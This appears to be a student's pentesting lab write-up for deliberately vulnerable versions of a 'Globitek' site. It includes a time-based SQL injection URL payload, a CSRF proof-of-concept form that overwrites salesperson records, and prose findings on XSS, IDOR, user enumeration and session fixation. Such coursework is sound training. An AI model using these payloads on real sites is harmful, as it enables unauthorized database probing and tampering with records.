# Project 8 - Pentesting Live Targets

Time spent: **7** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection
blue/public/salesperson.php?id=' OR SLEEP(5)=0--'

Vulnerability #2: Session Hijacking/Fixation
Blue doesn't refresh and validate session ID frequently.


## Green

Vulnerability #1: User Enumeration
The error message shown when a username exists and log in was unsuccessful is bolded while it's not when the username does not exist.

Vulnerability #2: Cross-Site Scripting
Code can be entered for XXS in the Contact form.


## Red

Vulnerability #1: Insecure Direct Object Reference
red/public/salesperson.php?id=10 and red/public/salesperson.php?id=11 are available through URL manipulation.

Vulnerability #2: Cross-Site Request Forgery
red/public/staff/salespeople/edit.php is vulnerable to CSRF
<form action="https://35.184.91.184/red/public/staff/salespeople/edit.php?id=5" method="post">
  <input type="text" name="first_name" value="HACKED">
  <input type="text" name="last_name" value="HACKED">
  <input type="text" name="phone" value="000-000-0000">
  <input type="text" name="email" value="hacked@hacked.com">
  <input type="submit" value="Submit">
</form>



## Notes

Describe any challenges encountered while doing the work

